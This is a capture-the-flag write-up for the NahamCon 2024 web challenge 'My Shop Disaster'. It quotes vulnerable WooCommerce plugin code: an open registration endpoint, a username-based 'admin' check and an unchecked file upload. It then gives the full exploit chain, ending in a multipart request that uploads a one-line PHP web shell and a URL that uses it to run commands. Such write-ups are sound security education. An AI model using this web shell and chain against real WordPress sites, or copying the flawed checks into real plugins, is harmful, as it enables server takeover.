---
layout: load_md
title: The White Circle | Nahamcon 2024 | My Shop Disaster Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Nahamcon 2024
parent: nahamcon_2024
category: web
challenge: My Shop Disaster
tags: "web, starry, wordpress, woocommerce, rce"
date: 2024-05-28T00:00:00+00:00
last_modified_at: 2024-05-28T00:00:00+00:00
---

<h1 class="heading card-title white-text">Nahamcon 2024</h1>


## My Shop Disaster
> Solved too late by: Starlord

Mirror : <a href="https://synthweb.ch/blog/nahamcon-ctf-2024/my-shop-disaster">https://synthweb.ch/blog/nahamcon-ctf-2024/my-shop-disaster</a>


This is another write-up for posterity, even though it was solved after the competition.


![challenge description](https://i.imgur.com/ekDMsYY.png)


This is a fresh Wordpress install with Woocommerce and another plugin that needs to be reviewed for security, which is a typical real life scenario I encounter frequently in my line of work.


Here is the latest twenty-twenty-four theme from Wordpress, with Woocommerce and a twist:


![twenty-twenty-four theme by wordpress](https://i.imgur.com/P2Bnk7d.png)


We can quickly find a `/my-account/` endpoint, which is a login page.


![Login endpoint](https://i.imgur.com/KqOyEYT.png)


We have the plugin in a zip archive to pry open. Time to read and understand a lot of PHP. One of the first things I found out about was the possibility to enable user registration from one of the plugin’s rest-endpoint:


- challenge-custom/woo-variations/includes/class-woo-variations-rest-api.php (partial):

```
function register_customer_registration_disable() {
        register_rest_route( 'woo-variations/v1', '/registration-disable/', array(
                'methods'  => 'GET',
                'callback' => array($this, 'registration_disable'),
                'args'     => array(
                        'data' => array(
                        'required' => false,
                        'default'  => array(),
                        )
                )
         ));
}

function registration_disable( $data ) {
        update_option( 'users_can_register', 0 );
        wp_send_json('Customer registration disabled');
}

function register_customer_registration_enable() {
        register_rest_route( 'woo-variations/v1', '/registration-enable/', array(
                'methods'  => 'GET',
                'callback' => array($this, 'registration_enable'),
                'args'     => array(
                        'data' => array(
                        'required' => false,
                        'default'  => array(),
                        )
                )
         ));
}
```

This shows us we have a woo-variations api endpoint we can call for 2 actions:

- registration_disable
- registration_enable

That’s when practice actually helped me in real time, as I knew we could call api endpoints from `/wp-json/`. Making a request to the following url allowed to use the ‘feature’:

```
http://localhost:8686/wp-json/woo-variations/v1/registration-enable
```

![Customer registration enabled](https://i.imgur.com/xYazrB7.png)


Next step, I immediately retried to visit `/wp-admin`, and this time instead of a custom login page, I saw the usual Wordpress login, with the expected ‘Register’ button. Here’s the customer dashboard:


![Customer dashboard](https://i.imgur.com/MgQE3tC.png)


At this point, there was another part of the code that was problematic in a security perspective:


- challenge-custom/woo-variations/includes/class-woo-variations-backend.php (partial)

```
function check_permission() {

        if ( !current_user_can( "manage_options" ) && strpos( wp_get_current_user()->user_login, 'admin' ) === false )
        {
                 return false;
        }

        return true;
}
```

We can see the code checks for 2 conditions to be true, and that the second check is actually just looking for the string ‘admin’ in the username. 


> The strpos() function finds the position of the first occurrence of a string inside another string. Note: The strpos() function is case-sensitive.
> 
> https://www.w3schools.com/php/func_string_strpos.asp

So the best thing to do now is to create a user with a login username that contains the word ‘admin’ such as admin-starlord, which allowed me to access features from the backend. I tried modifiying my current username by clicking the account details, but that didn’t work. I needed a new user:


![admin in username trick](https://i.imgur.com/OjgUARk.png)


The next interesting feature was `set_gallery_picture`, because it allows to upload a file to the wordpress installation:

- challenge-custom/woo-variations/includes/class-woo-variations-backend.php (partial)

```
public function set_gallery_picture() {

        if ( !is_admin() || !$this->check_permission() )
        {
                wp_send_json( 'Unauthorized!' );
        }

        $product_id = isset( $_POST['product_id'] ) ? intval( $_POST['product_id'] ) : 0;

        // Verify that the product exists and is a WooCommerce product
        if ( $product_id && function_exists( 'wc_get_product' ) ) {

                if ( $_FILES && isset( $_FILES['gallery_picture'] ) ) {

                        $file = $_FILES['gallery_picture'];
                        $file_type = wp_check_filetype( basename( $file['name'] ), array( 'jpg', 'jpeg', 'png' ) );

                        $upload_dir = wp_upload_dir();
                        $upload_path = $upload_dir['basedir'] . '/woo-gallery/';
                        if ( !file_exists( $upload_path ) ) {
                                wp_mkdir_p( $upload_path );
                        }

                        if (move_uploaded_file( $file['tmp_name'], $upload_path . sanitize_file_name($file['name']) ) ) {

                                $file_url = $upload_dir['baseurl'] . '/woo-gallery/' . sanitize_file_name($file['name']);

                                if (function_exists( 'wc_gallery_set_attachment_from_url' ) )
                                {
                                        $attachment_id = wc_gallery_set_attachment_from_url( $file_url, $product_id);
                                        if ( $attachment_id) {
                                                echo json_encode(array( 'success' => true, 'message' => 'Gallery picture uploaded successfully.' ) );
                                        } else {
                                                echo json_encode(array( 'success' => false, 'message' => 'Error adding attachment to product gallery.' ) );
                                        }
                                }
                                else {
                                        echo json_encode(array( 'success' => false, 'message' => 'Error adding attachment to Woocommerce product.' ) );
                                }

                        } else {
                                echo json_encode(array( 'success' => false, 'message' => 'Error uploading file.' ) );
                        }
                } else {
                        echo json_encode(array( 'success' => false, 'message' => 'No file uploaded.' ) );
                }
        } else {
                echo json_encode(array( 'success' => false, 'message' => 'Invalid product ID.' ) );
        }
}
```

We actually don’t have to worry about the first `is_admin()` check, because this function will return true whenever the current URL is for a page on the admin side of WordPress, so no need for more privilege either, in order to upload a file. To do so, I used burpsuite, and it’s very useful `Change body encoding` feature, to have it automatically encode in multipart format, automatically setting the correct boundary header and Content-Type.


![Change body encoding](https://i.imgur.com/peGdJ5x.png)


But how do we use it? when we used the wp-json api earlier, this time it wouldn’t work, because in fact it had been added as a wp-ajax action:


```
public function hooks() {
        add_filter( 'getmoreplugins_get_settings_pages', array( $this, 'init_settings' ) );

        add_filter( 'plugin_action_links_' . plugin_basename( WOO_VARIATIONS_PLUGIN_FILE ), array(
                $this,
                'plugin_action_links'
        ) );

        add_action( 'admin_enqueue_scripts', array( $this, 'admin_enqueue_scripts' ) );
        add_action( 'admin_footer', array( $this, 'admin_template_js' ) );

        add_action( 'wp_ajax_associate_product_variation', array( $this, 'associate_product_variation' ) );
        add_action( 'wp_ajax_nopriv_associate_product_variation', array( $this, 'associate_product_variation' ) );

        add_action( 'wp_ajax_set_gallery_picture', array( $this, 'set_gallery_picture' ) );
        add_action( 'wp_ajax_nopriv_set_gallery_picture', array( $this, 'set_gallery_picture' ) );

        add_action( 'woocommerce_save_product_variation', array( $this, 'save_product_variation' ), 10, 2 );
        add_action( 'woocommerce_product_after_variable_attributes', array( $this, 'gallery_admin_html' ), 10, 3 );

        add_action( 'after_switch_theme', array( $this, 'remove_option' ), 20 );
                }
```

Basically this means we can call this action from :

```
http://localhost:8686/wp-admin/admin-ajax.php?action=set_gallery_picture&product_id=0&gallery_picture=
```

![](https://i.imgur.com/zpMwXXi.png)


By calling that url, we could manage to send a POST request with the correct parameters to upload a gallery_picture through Burpsuite. In order for the change body encoding option to work, I had to add `Content-Type: x-www-form-urlencoded`, and a filename for my payload as well:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: challenge.nahamcon.com:port
Cookie: wordpress_b1fc8e0fa54a56c9a22d3b9c2fe67c92=admin-starlord%7C1716846545%7CumCgWrWQc1muc3GhFyIJpzpPbfCUIinVqP6KEeeMKQX%7Cf3f986009f4f4d1185ed6728024ca7ed031c5a2e0d7fa2911ce0352e9f7a943b
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Length: 396

------WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Disposition: form-data; name="action"

set_gallery_picture
------WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Disposition: form-data; name="product_id"

1
------WebKitFormBoundaryoUIWKzm0piFTNvbB
Content-Disposition: form-data; name="gallery_picture"; filename="starlord.php"

<?php if (isset($_GET['cmd'])) system($_GET['cmd']); ?>
------WebKitFormBoundaryoUIWKzm0piFTNvbB--
```

If the error message changes it means the code went one level deeper at least, here’s the response:

```
{"success":false,"message":"Error adding attachment to Woocommerce product."}0
```

Regardless of the message, we know the file has already been uploaded, so we can just navigate to starlord.php and add the correct parameter:


![Flag for testing](https://i.imgur.com/ikUhXeF.png)


```
/wp-content/uploads/woo-gallery/starlord.php?cmd=cat /flag.txt
```

